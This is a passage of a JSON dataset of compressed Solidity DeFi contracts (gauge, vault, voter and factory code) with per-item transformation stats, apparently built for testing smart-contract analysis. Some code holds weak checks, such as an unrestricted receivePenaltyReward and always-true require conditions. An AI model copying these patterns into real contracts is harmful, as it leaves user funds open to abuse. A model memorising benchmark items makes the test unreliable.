protocolFeeModule.excessivelySafeStaticCall(\n200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool)\n);\nif (success) {\nuint24 fee = abi.decode(data, (uint24));\nif (fee <= 500_000) {\nreturn fee;\n}\n}\n}\nreturn defaultProtocolFee;\n}\nfunction enableTickSpacing(int24 tickSpacing, uint24 fee) public override {\nrequire(msg.sender == owner);\nrequire(fee > 0 && fee <= 100_000);\nrequire(tickSpacing > 0 && tickSpacing < 16384);\nrequire(tickSpacingToFee[tickSpacing] == 0);\ntickSpacingToFee[tickSpacing] = fee;\n_tickSpacings.push(tickSpacing);\nemit TickSpacingEnabled(tickSpacing, fee);\n}\nfunction collectAllProtocolFees() external {\nrequire(msg.sender == owner);\nfor (uint256 i = 0; i < allPools.length; i++) {\nCLPool(allPools[i]).collectProtocolFees(msg.sender);\n}\n}\nfunction collectProtocolFees(address pool) external returns (uint128 amount0, uint128 amount1) {\nrequire(msg.sender == owner);\n(amount0, amount1) = CLPool(pool).collectProtocolFees(msg.sender);\n}\nfunction tickSpacings() external view override returns (int24[] memory) {\nreturn _tickSpacings;\n}\nfunction allPoolsLength() external view override returns (uint256) {\nreturn allPools.length;\n}\nfunction isPool(address pool) external view override returns (bool) {\nreturn _isPool[pool];\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 48,
        "mode": "compressed",
        "original_lines": 272,
        "transformed_lines": 204,
        "original_chars": 10283,
        "transformed_chars": 7275,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_gs_003",
      "transformed_id": "ss_l1_compressed_sn_gs_003",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport './interfaces/IPair.sol';\nimport './interfaces/IBribe.sol';\nimport \"./libraries/Math.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport './interfaces/IRHYBR.sol';\ninterface IRewarder {\nfunction onReward(\naddress user,\naddress recipient,\nuint256 userBalance\n) external;\n}\ncontract GaugeV2 is ReentrancyGuard, Ownable {\nusing SafeERC20 for IERC20;\nbool public immutable isForPair;\nbool public emergency;\nIERC20 public immutable rewardToken;\nIERC20 public immutable TOKEN;\naddress public immutable rHYBR;\naddress public VE;\naddress public DISTRIBUTION;\naddress public gaugeRewarder;\naddress public internal_bribe;\naddress public external_bribe;\nuint256 public DURATION;\nuint256 internal _periodFinish;\nuint256 public rewardRate;\nuint256 public lastUpdateTime;\nuint256 public rewardPerTokenStored;\nmapping(address => uint256) public userRewardPerTokenPaid;\nmapping(address => uint256) public rewards;\nuint256 internal _totalSupply;\nmapping(address => uint256) internal _balances;\nmapping(address => uint256) public maturityTime;\nevent RewardAdded(uint256 reward);\nevent Deposit(address indexed user, uint256 amount);\nevent Withdraw(address indexed user, uint256 amount);\nevent Harvest(address indexed user, uint256 reward);\nevent ClaimFees(address indexed from, uint256 claimed0, uint256 claimed1);\nevent EmergencyActivated(address indexed gauge, uint256 timestamp);\nevent EmergencyDeactivated(address indexed gauge, uint256 timestamp);\nmodifier updateReward(address account) {\nrewardPerTokenStored = rewardPerToken();\nlastUpdateTime = lastTimeRewardApplicable();\nif (account != address(0)) {\nrewards[account] = earned(account);\nuserRewardPerTokenPaid[account] = rewardPerTokenStored;\n}\n_;\n}\nmodifier onlyDistribution() {\nrequire(msg.sender == DISTRIBUTION, \"NA\");\n_;\n}\nmodifier isNotEmergency() {\nrequire(emergency == false, \"EMER\");\n_;\n}\nconstructor(address _rewardToken,address _rHYBR,address _ve,address _token,address _distribution, address _internal_bribe, address _external_bribe, bool _isForPair) {\nrewardToken = IERC20(_rewardToken);\nrHYBR = _rHYBR;\nVE = _ve;\nTOKEN = IERC20(_token);\nDISTRIBUTION = _distribution;\nDURATION = HybraTimeLibrary.WEEK;\ninternal_bribe = _internal_bribe;\nexternal_bribe = _external_bribe;\nisForPair = _isForPair;\nemergency = false;\n}\nfunction setDistribution(address _distribution) external onlyOwner {\nrequire(_distribution != address(0), \"ZA\");\nrequire(_distribution != DISTRIBUTION, \"SAME_ADDR\");\nDISTRIBUTION = _distribution;\n}\nfunction setGaugeRewarder(address _gaugeRewarder) external onlyOwner {\nrequire(_gaugeRewarder != gaugeRewarder, \"SAME_ADDR\");\ngaugeRewarder = _gaugeRewarder;\n}\nfunction setInternalBribe(address _int) external onlyOwner {\nrequire(_int >= address(0), \"ZA\");\ninternal_bribe = _int;\n}\nfunction activateEmergencyMode() external onlyOwner {\nrequire(emergency == false, \"EMER\");\nemergency = true;\nemit EmergencyActivated(address(this), block.timestamp);\n}\nfunction stopEmergencyMode() external onlyOwner {\nrequire(emergency == true,\"EMER\");\nemergency = false;\nemit EmergencyDeactivated(address(this), block.timestamp);\n}\nfunction totalSupply() public view returns (uint256) {\nreturn _totalSupply;\n}\nfunction balanceOf(address account) external view returns (uint256) {\nreturn _balanceOf(account);\n}\nfunction _balanceOf(address account) internal view returns (uint256) {\nreturn _balances[account];\n}\nfunction lastTimeRewardApplicable() public view returns (uint256) {\nreturn Math.min(block.timestamp, _periodFinish);\n}\nfunction rewardPerToken() public view returns (uint256) {\nif (_totalSupply == 0) {\nreturn rewardPerTokenStored;\n} else {\nreturn rewardPerTokenStored + (lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18 / _totalSupply;\n}\n}\nfunction earned(address account) public view returns (uint256) {\nreturn rewards[account] + _balanceOf(account) * (rewardPerToken() - userRewardPerTokenPaid[account]) / 1e18;\n}\nfunction rewardForDuration() external view returns (uint256) {\nreturn rewardRate * DURATION;\n}\nfunction periodFinish() external view returns (uint256) {\nreturn _periodFinish;\n}\nfunction depositAll() external {\n_deposit(TOKEN.balanceOf(msg.sender), msg.sender);\n}\nfunction deposit(uint256 amount) external {\n_deposit(amount, msg.sender);\n}\nfunction _deposit(uint256 amount, address account) internal nonReentrant isNotEmergency updateReward(account) {\nrequire(amount > 0, \"ZV\");\n_balances[account] = _balances[account] + amount;\n_totalSupply = _totalSupply + amount;\nif (address(gaugeRewarder) != address(0)) {\nIRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));\n}\nTOKEN.safeTransferFrom(account, address(this), amount);\nemit Deposit(account, amount);\n}\nfunction withdrawAll() external {\n_withdraw(_balanceOf(msg.sender));\n}\nfunction withdraw(uint256 amount) external {\n_withdraw(amount);\n}\nfunction _withdraw(uint256 amount) internal nonReentrant isNotEmergency updateReward(msg.sender) {\nrequire(amount > 0, \"ZV\");\nrequire(_balanceOf(msg.sender) > 0, \"ZV\");\nrequire(block.timestamp >= maturityTime[msg.sender], \"!MATURE\");\n_totalSupply = _totalSupply - amount;\n_balances[msg.sender] = _balances[msg.sender] - amount;\nif (address(gaugeRewarder) != address(0)) {\nIRewarder(gaugeRewarder).onReward(msg.sender, msg.sender,_balanceOf(msg.sender));\n}\nTOKEN.safeTransfer(msg.sender, amount);\nemit Withdraw(msg.sender, amount);\n}\nfunction emergencyWithdraw() external nonReentrant {\nrequire(emergency, \"EMER\");\nuint256 _amount = _balanceOf(msg.sender);\nrequire(_amount > 0, \"ZV\");\n_totalSupply = _totalSupply - _amount;\n_balances[msg.sender] = 0;\nTOKEN.safeTransfer(msg.sender, _amount);\nemit Withdraw(msg.sender, _amount);\n}\nfunction emergencyWithdrawAmount(uint256 _amount) external nonReentrant {\nrequire(emergency, \"EMER\");\n_totalSupply = _totalSupply - _amount;\n_balances[msg.sender] = _balances[msg.sender] - _amount;\nTOKEN.safeTransfer(msg.sender, _amount);\nemit Withdraw(msg.sender, _amount);\n}\nfunction withdrawAllAndHarvest(uint8 _redeemType) external {\n_withdraw(_balanceOf(msg.sender));\ngetReward(_redeemType);\n}\nfunction getReward(address _user, uint8 _redeemType) public nonReentrant onlyDistribution updateReward(_user) {\nuint256 reward = rewards[_user];\nif (reward > 0) {\nrewards[_user] = 0;\nIERC20(rewardToken).safeApprove(rHYBR, reward);\nIRHYBR(rHYBR).depostionEmissionsToken(reward);\nIRHYBR(rHYBR).redeemFor(reward, _redeemType, _user);\nemit Harvest(_user, reward);\n}\nif (gaugeRewarder != address(0)) {\nIRewarder(gaugeRewarder).onReward(_user, _user, _balanceOf(_user));\n}\n}\nfunction getReward(uint8 _redeemType) public nonReentrant updateReward(msg.sender) {\nuint256 reward = rewards[msg.sender];\nif (reward > 0) {\nrewards[msg.sender] = 0;\nIERC20(rewardToken).safeApprove(rHYBR, reward);\nIRHYBR(rHYBR).depostionEmissionsToken(reward);\nIRHYBR(rHYBR).redeemFor(reward, _redeemType, msg.sender);\nemit Harvest(msg.sender, reward);\n}\nif (gaugeRewarder != address(0)) {\nIRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));\n}\n}\nfunction notifyRewardAmount(address token, uint256 reward) external nonReentrant isNotEmergency onlyDistribution updateReward(address(0)) {\nrequire(token == address(rewardToken), \"IA\");\nrewardToken.safeTransferFrom(DISTRIBUTION, address(this), reward);\nif (block.timestamp >= _periodFinish) {\nrewardRate = reward / DURATION;\n} else {\nuint256 remaining = _periodFinish - block.timestamp;\nuint256 leftover = remaining * rewardRate;\nrewardRate = (reward + leftover) / DURATION;\n}\nuint256 balance = rewardToken.balanceOf(address(this));\nrequire(rewardRate <= balance / DURATION, \"REWARD_HIGH\");\nlastUpdateTime = block.timestamp;\n_periodFinish = block.timestamp + DURATION;\nemit RewardAdded(reward);\n}\nfunction claimFees() external nonReentrant returns (uint256 claimed0, uint256 claimed1) {\nreturn _claimFees();\n}\nfunction _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\nif (!isForPair) {\nreturn (0, 0);\n}\naddress _token = address(TOKEN);\n(claimed0, claimed1) = IPair(_token).claimFees();\nif (claimed0 > 0 || claimed1 > 0) {\nuint256 _fees0 = claimed0;\nuint256 _fees1 = claimed1;\n(address _token0, address _token1) = IPair(_token).tokens();\nif (_fees0 > 0) {\nIERC20(_token0).safeApprove(internal_bribe, 0);\nIERC20(_token0).safeApprove(internal_bribe, _fees0);\nIBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\n}\nif (_fees1 > 0) {\nIERC20(_token1).safeApprove(internal_bribe, 0);\nIERC20(_token1).safeApprove(internal_bribe, _fees1);\nIBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\n}\nemit ClaimFees(msg.sender, claimed0, claimed1);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 72,
        "mode": "compressed",
        "original_lines": 379,
        "transformed_lines": 249,
        "original_chars": 14289,
        "transformed_chars": 8845,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_gs_004",
      "transformed_id": "ss_l1_compressed_sn_gs_004",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.13;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./interfaces/IVotingEscrow.sol\";\nimport \"./interfaces/IVoter.sol\";\nimport \"./interfaces/IBribe.sol\";\nimport \"./interfaces/IRewardsDistributor.sol\";\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/ISwapper.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\nusing SafeERC20 for IERC20;\nuint256 public transferLockPeriod = 24 hours;\nuint256 public constant MIN_LOCK_PERIOD = 1 minutes;\nuint256 public constant MAX_LOCK_PERIOD = 240 minutes;\nuint256 public head_not_withdraw_time = 1200;\nuint256 public tail_not_withdraw_time = 300;\nuint256 public withdrawFee = 100;\nuint256 public constant MIN_WITHDRAW_FEE = 10;\nuint256 public constant MAX_WITHDRAW_FEE = 1000;\nuint256 public constant BASIS = 10000;\naddress public Team;\nuint256 public rebase;\nuint256 public penalty;\nuint256 public votingYield;\nstruct UserLock {\nuint256 amount;\nuint256 unlockTime;\n}\nmapping(address => UserLock[]) public userLocks;\nmapping(address => uint256) public lockedBalance;\naddress public immutable HYBR;\naddress public immutable votingEscrow;\naddress public voter;\naddress public rewardsDistributor;\naddress public gaugeManager;\nuint256 public veTokenId;\naddress public operator;\nuint256 public lastVoteEpoch;\nuint256 public lastRebaseTime;\nuint256 public lastCompoundTime;\nISwapper public swapper;\nerror NOT_AUTHORIZED();\nevent Deposit(address indexed user, uint256 hybrAmount, uint256 sharesReceived);\nevent Withdraw(address indexed user, uint256 shares, uint256 hybrAmount, uint256 fee);\nevent Compound(uint256 rewards, uint256 newTotalLocked);\nevent PenaltyRewardReceived(uint256 amount);\nevent TransferLockPeriodUpdated(uint256 oldPeriod, uint256 newPeriod);\nevent SwapperUpdated(address indexed oldSwapper, address indexed newSwapper);\nevent VoterSet(address voter);\nevent EmergencyUnlock(address indexed user);\nevent AutoVotingEnabled(bool enabled);\nevent OperatorUpdated(address indexed oldOperator, address indexed newOperator);\nevent DefaultVotingStrategyUpdated(address[] pools, uint256[] weights);\nevent AutoVoteExecuted(uint256 epoch, address[] pools, uint256[] weights);\nconstructor(\naddress _HYBR,\naddress _votingEscrow\n) ERC20(\"Growth HYBR\", \"gHYBR\") {\nrequire(_HYBR != address(0), \"Invalid HYBR\");\nrequire(_votingEscrow != address(0), \"Invalid VE\");\nHYBR = _HYBR;\nvotingEscrow = _votingEscrow;\nlastRebaseTime = block.timestamp;\nlastCompoundTime = block.timestamp;\noperator = msg.sender;\n}\nfunction setRewardsDistributor(address _rewardsDistributor) external onlyOwner {\nrequire(_rewardsDistributor != address(0), \"Invalid rewards distributor\");\nrewardsDistributor = _rewardsDistributor;\n}\nfunction setGaugeManager(address _gaugeManager) external onlyOwner {\nrequire(_gaugeManager != address(0), \"Invalid gauge manager\");\ngaugeManager = _gaugeManager;\n}\nmodifier onlyOperator() {\nif (msg.sender != operator) {\nrevert NOT_AUTHORIZED();\n}\n_;\n}\nfunction deposit(uint256 amount, address recipient) external nonReentrant {\nrequire(amount > 0, \"Zero amount\");\nrecipient = recipient == address(0) ? msg.sender : recipient;\nIERC20(HYBR).transferFrom(msg.sender, address(this), amount);\nif (veTokenId == 0) {\n_initializeVeNFT(amount);\n} else {\nIERC20(HYBR).approve(votingEscrow, amount);\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\n_extendLockToMax();\n}\nuint256 shares = calculateShares(amount);\n_mint(recipient, shares);\n_addTransferLock(recipient, shares);\nemit Deposit(msg.sender, amount, shares);\n}\nfunction withdraw(uint256 shares) external nonReentrant returns (uint256 userTokenId) {\nrequire(shares > 0, \"Zero shares\");\nrequire(balanceOf(msg.sender) >= shares, \"Insufficient balance\");\nrequire(veTokenId != 0, \"No veNFT initialized\");\nrequire(IVotingEscrow(votingEscrow).voted(veTokenId) == false, \"Cannot withdraw yet\");\nuint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);\nuint256 epochNext = HybraTimeLibrary.epochNext(block.timestamp);\nrequire(block.timestamp >= epochStart + head_not_withdraw_time && block.timestamp < epochNext - tail_not_withdraw_time, \"Cannot withdraw yet\");\nuint256 hybrAmount = calculateAssets(shares);\nrequire(hybrAmount > 0, \"No assets to withdraw\");\nuint256 feeAmount = 0;\nif (withdrawFee > 0) {\nfeeAmount = (hybrAmount * withdrawFee) / BASIS;\n}\nuint256 userAmount = hybrAmount - feeAmount;\nrequire(userAmount > 0, \"Amount too small after fee\");\nuint256 veBalance = totalAssets();\nrequire(hybrAmount <= veBalance, \"Insufficient veNFT balance\");\nuint256 remainingAmount = veBalance - userAmount - feeAmount;\nrequire(remainingAmount >= 0, \"Cannot withdraw entire veNFT\");\n_burn(msg.sender, shares);\nuint256[] memory amounts = new uint256[](3);\namounts[0] = remainingAmount;\namounts[1] = userAmount;\namounts[2] = feeAmount;\nuint256[] memory newTokenIds = IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);\nveTokenId = newTokenIds[0];\nuserTokenId = newTokenIds[1];\nuint256 feeTokenId = newTokenIds[2];\nIVotingEscrow(votingEscrow).safeTransferFrom(address(this), msg.sender, userTokenId);\nIVotingEscrow(votingEscrow).safeTransferFrom(address(this), Team, feeTokenId);\nemit Withdraw(msg.sender, shares, userAmount, feeAmount);\n}\nfunction _initializeVeNFT(uint256 initialAmount) internal {\nIERC20(HYBR).approve(votingEscrow, type(uint256).max);\nuint256 lockTime = HybraTimeLibrary.MAX_LOCK_DURATION;\nveTokenId = IVotingEscrow(votingEscrow).create_lock_for(initialAmount, lockTime, address(this));\n}\nfunction calculateShares(uint256 amount) public view returns (uint256) {\nuint256 _totalSupply = totalSupply();\nuint256 _totalAssets = totalAssets();\nif (_totalSupply == 0 || _totalAssets == 0) {\nreturn amount;\n}\nreturn (amount * _totalSupply) / _totalAssets;\n}\nfunction calculateAssets(uint256 shares) public view returns (uint256) {\nuint256 _totalSupply = totalSupply();\nif (_totalSupply == 0) {\nreturn shares;\n}\nreturn (shares * totalAssets()) / _totalSupply;\n}\nfunction totalAssets() public view returns (uint256) {\nif (veTokenId == 0) {\nreturn 0;\n}\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nreturn uint256(int256(locked.amount));\n}\nfunction _addTransferLock(address user, uint256 amount) internal {\nuint256 unlockTime = block.timestamp + transferLockPeriod;\nuserLocks[user].push(UserLock({\namount: amount,\nunlockTime: unlockTime\n}));\nlockedBalance[user] += amount;\n}\nfunction previewAvailable(address user) external view returns (uint256 available) {\nuint256 totalBalance = balanceOf(user);\nuint256 currentLocked = 0;\nUserLock[] storage arr = userLocks[user];\nfor (uint256 i = 0; i < arr.length; i++) {\nif (arr[i].unlockTime > block.timestamp) {\ncurrentLocked += arr[i].amount;\n}\n}\nreturn totalBalance > currentLocked ? totalBalance - currentLocked : 0;\n}\nfunction _cleanExpired(address user) internal returns (uint256 freed) {\nUserLock[] storage arr = userLocks[user];\nuint256 len = arr.length;\nif (len == 0) return 0;\nuint256 write = 0;\nunchecked {\nfor (uint256 i = 0; i < len; i++) {\nUserLock memory L = arr[i];\nif (L.unlockTime <= block.timestamp) {\nfreed += L.amount;\n} else {\nif (write != i) arr[write] = L;\nwrite++;\n}\n}\nif (freed > 0) {\nlockedBalance[user] -= freed;\n}\nwhile (arr.length > write) {\narr.pop();\n}\n}\n}\nfunction _beforeTokenTransfer(\naddress from,\naddress to,\nuint256 amount\n) internal override {\nsuper._beforeTokenTransfer(from, to, amount);\nif (from != address(0) && to != address(0)) {\nuint256 totalBalance = balanceOf(from);\nuint256 currentAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\nif (currentAvailable >= amount) {\nreturn;\n}\n_cleanExpired(from);\nuint256 finalAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\nrequire(finalAvailable >= amount, \"Tokens locked\");\n}\n}\nfunction claimRewards() external onlyOperator {\nrequire(voter != address(0), \"Voter not set\");\nrequire(rewardsDistributor != address(0), \"Distributor not set\");\nuint256 rebaseAmount = IRewardsDistributor(rewardsDistributor).claim(veTokenId);\nrebase += rebaseAmount;\naddress[] memory votedPools = IVoter(voter).poolVote(veTokenId);\nfor (uint256 i = 0; i < votedPools.length; i++) {\nif (votedPools[i] != address(0)) {\naddress gauge = IGaugeManager(gaugeManager).gauges(votedPools[i]);\nif (gauge != address(0)) {\naddress[] memory bribes = new address[](1);\naddress[][] memory tokens = new address[][](1);\naddress internalBribe = IGaugeManager(gaugeManager).internal_bribes(gauge);\nif (internalBribe != address(0)) {\nuint256 tokenCount = IBribe(internalBribe).rewardsListLength();\nif (tokenCount > 0) {\naddress[] memory bribeTokens = new address[](tokenCount);\nfor (uint256 j = 0; j < tokenCount; j++) {\nbribeTokens[j] = IBribe(internalBribe).bribeTokens(j);\n}\nbribes[0] = internalBribe;\ntokens[0] = bribeTokens;\nIGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\n}\n}\naddress externalBribe = IGaugeManager(gaugeManager).external_bribes(gauge);\nif (externalBribe != address(0)) {\nuint256 tokenCount = IBribe(externalBribe).rewardsListLength();\nif (tokenCount > 0) {\naddress[] memory bribeTokens = new address[](tokenCount);\nfor (uint256 j = 0; j < tokenCount; j++) {\nbribeTokens[j] = IBribe(externalBribe).bribeTokens(j);\n}\nbribes[0] = externalBribe;\ntokens[0] = bribeTokens;\nIGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\n}\n}\n}\n}\n}\n}\nfunction executeSwap(ISwapper.SwapParams calldata _params) external nonReentrant onlyOperator {\nrequire(address(swapper) != address(0), \"Swapper not set\");\nuint256 tokenBalance = IERC20(_params.tokenIn).balanceOf(address(this));\nrequire(tokenBalance >= _params.amountIn, \"Insufficient token balance\");\nIERC20(_params.tokenIn).safeApprove(address(swapper), _params.amountIn);\nuint256 hybrReceived = swapper.swapToHYBR(_params);\nIERC20(_params.tokenIn).safeApprove(address(swapper), 0);\nvotingYield += hybrReceived;\n}\nfunction compound() external onlyOperator {\nuint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));\nif (hybrBalance > 0) {\nIERC20(HYBR).safeApprove(votingEscrow, hybrBalance);\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance);\n_extendLockToMax();\nlastCompoundTime = block.timestamp;\nemit Compound(hybrBalance, totalAssets());\n}\n}\nfunction vote(address[] calldata _poolVote, uint256[] calldata _weights) external {\nrequire(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\nrequire(voter != address(0), \"Voter not set\");\nIVoter(voter).vote(veTokenId, _poolVote, _weights);\nlastVoteEpoch = HybraTimeLibrary.epochStart(block.timestamp);\n}\nfunction reset() external {\nrequire(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\nrequire(voter != address(0), \"Voter not set\");\nIVoter(voter).reset(veTokenId);\n}\nfunction receivePenaltyReward(uint256 amount) external {\nif (amount > 0) {\nIERC20(HYBR).approve(votingEscrow, amount);\nif(veTokenId == 0){\n_initializeVeNFT(amount);\n} else{\nIVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\n_extendLockToMax();\n}\n}\npenalty += amount;\nemit PenaltyRewardReceived(amount);\n}\nfunction setVoter(address _voter) external onlyOwner {\nrequire(_voter != address(0), \"Invalid voter\");\nvoter = _voter;\nemit VoterSet(_voter);\n}\nfunction setTransferLockPeriod(uint256 _period) external onlyOwner {\nrequire(_period >= MIN_LOCK_PERIOD && _period <= MAX_LOCK_PERIOD, \"Invalid period\");\nuint256 oldPeriod = transferLockPeriod;\ntransferLockPeriod = _period;\nemit TransferLockPeriodUpdated(oldPeriod, _period);\n}\nfunction setWithdrawFee(uint256 _fee) external onlyOwner {\nrequire(_fee >= MIN_WITHDRAW_FEE && _fee <= MAX_WITHDRAW_FEE, \"Invalid fee\");\nwithdrawFee = _fee;\n}\nfunction setHeadNotWithdrawTime(uint256 _time) external onlyOwner {\nhead_not_withdraw_time = _time;\n}\nfunction setTailNotWithdrawTime(uint256 _time) external onlyOwner {\ntail_not_withdraw_time = _time;\n}\nfunction setSwapper(address _swapper) external onlyOwner {\nrequire(_swapper != address(0), \"Invalid swapper\");\naddress oldSwapper = address(swapper);\nswapper = ISwapper(_swapper);\nemit SwapperUpdated(oldSwapper, _swapper);\n}\nfunction setTeam(address _team) external onlyOwner {\nrequire(_team != address(0), \"Invalid team\");\nTeam = _team;\n}\nfunction emergencyUnlock(address user) external onlyOperator {\ndelete userLocks[user];\nlockedBalance[user] = 0;\nemit EmergencyUnlock(user);\n}\nfunction getUserLocks(address user) external view returns (UserLock[] memory) {\nreturn userLocks[user];\n}\nfunction setOperator(address _operator) external onlyOwner {\nrequire(_operator != address(0), \"Invalid operator\");\naddress oldOperator = operator;\noperator = _operator;\nemit OperatorUpdated(oldOperator, _operator);\n}\nfunction getLockEndTime() external view returns (uint256) {\nif (veTokenId == 0) {\nreturn 0;\n}\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nreturn uint256(locked.end);\n}\nfunction _extendLockToMax() internal {\nif (veTokenId == 0) return;\nIVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\nif (locked.isPermanent || locked.end <= block.timestamp) return;\nuint256 maxUnlockTime = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\nif (maxUnlockTime > locked.end + 2 hours) {\ntry IVotingEscrow(votingEscrow).increase_unlock_time(veTokenId, HybraTimeLibrary.MAX_LOCK_DURATION) {\n} catch {\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 110,
        "mode": "compressed",
        "original_lines": 616,
        "transformed_lines": 367,
        "original_chars": 23018,
        "transformed_chars": 13618,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_gs_005",
      "transformed_id": "ss_l1_compressed_sn_gs_005",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.13;\nimport './libraries/Math.sol';\nimport './interfaces/IBribe.sol';\nimport './interfaces/IERC20.sol';\nimport './interfaces/IPairInfo.sol';\nimport './interfaces/IPairFactory.sol';\nimport './interfaces/IVotingEscrow.sol';\nimport './interfaces/IGaugeManager.sol';\nimport './interfaces/IPermissionsRegistry.sol';\nimport './interfaces/ITokenHandler.sol';\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol\";\ncontract VoterV3 is OwnableUpgradeable, ReentrancyGuardUpgradeable {\nusing SafeERC20Upgradeable for IERC20Upgradeable;\naddress public _ve;\naddress internal base;\naddress public permissionRegistry;\naddress public tokenHandler;\nuint256 public maxVotingNum;\nuint public EPOCH_DURATION;\nuint256 internal constant MIN_VOTING_NUM = 10;\nIGaugeManager public gaugeManager;\nmapping(uint256 => mapping(address => uint256)) public votes;\nmapping(uint256 => address[]) public poolVote;\nmapping(address => uint256) public weights;\nuint256 public totalWeight;\nmapping(uint256 => uint256) public usedWeights;\nmapping(uint256 => uint256) public lastVoted;\nmapping(uint256 => uint256) public lastVotedTimestamp;\nevent Voted(address indexed voter, uint256 tokenId, uint256 weight);\nevent Abstained(uint256 tokenId, uint256 weight);\nevent SetPermissionRegistry(address indexed old, address indexed latest);\nconstructor() {}\nfunction initialize(\naddress __ve,\naddress _tokenHandler,\naddress _gaugeManager,\naddress _permissionRegistry\n) public initializer {\n__Ownable_init();\n__ReentrancyGuard_init();\n_ve = __ve;\nbase = IVotingEscrow(__ve).token();\ngaugeManager = IGaugeManager(_gaugeManager);\npermissionRegistry = _permissionRegistry;\ntokenHandler = _tokenHandler;\nmaxVotingNum = 30;\nEPOCH_DURATION = HybraTimeLibrary.WEEK;\n}\nmodifier VoterAdmin() {\nrequire(IPermissionsRegistry(permissionRegistry).hasRole(\"VOTER_ADMIN\",msg.sender), 'VOTER_ADMIN');\n_;\n}\nmodifier Governance() {\nrequire(IPermissionsRegistry(permissionRegistry).hasRole(\"GOVERNANCE\",msg.sender), 'GOVERNANCE');\n_;\n}\nmodifier GenesisManager() {\nrequire(IPermissionsRegistry(permissionRegistry).hasRole(\"GENESIS_MANAGER\", msg.sender), 'GENESIS_MANAGER');\n_;\n}\nfunction setPermissionsRegistry(address _permissionRegistry) external VoterAdmin {\nrequire(_permissionRegistry.code.length > 0, \"CODELEN\");\nrequire(_permissionRegistry != address(0), \"ZA\");\nemit SetPermissionRegistry(permissionRegistry, _permissionRegistry);\npermissionRegistry = _permissionRegistry;\n}\nfunction setMaxVotingNum(uint256 _maxVotingNum) external VoterAdmin {\nrequire (_maxVotingNum >= MIN_VOTING_NUM, \"LOW_VOTE\");\nmaxVotingNum = _maxVotingNum;\n}\nfunction reset(uint256 _tokenId) external onlyNewEpoch(_tokenId) nonReentrant {\nrequire(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\n_reset(_tokenId);\nIVotingEscrow(_ve).abstain(_tokenId);\n}\nfunction _reset(uint256 _tokenId) internal {\naddress[] storage _poolVote = poolVote[_tokenId];\nuint256 _poolVoteCnt = _poolVote.length;\nuint256 _totalWeight = 0;\nfor (uint256 i = 0; i < _poolVoteCnt; i ++) {\naddress _pool = _poolVote[i];\nuint256 _votes = votes[_tokenId][_pool];\nif (_votes != 0) {\nweights[_pool] -= _votes;\nvotes[_tokenId][_pool] -= _votes;\naddress internal_bribe = gaugeManager.fetchInternalBribeFromPool(_pool);\naddress external_bribe = gaugeManager.fetchExternalBribeFromPool(_pool);\nIBribe(internal_bribe).withdraw(uint256(_votes), _tokenId);\nIBribe(external_bribe).withdraw(uint256(_votes), _tokenId);\n_totalWeight += 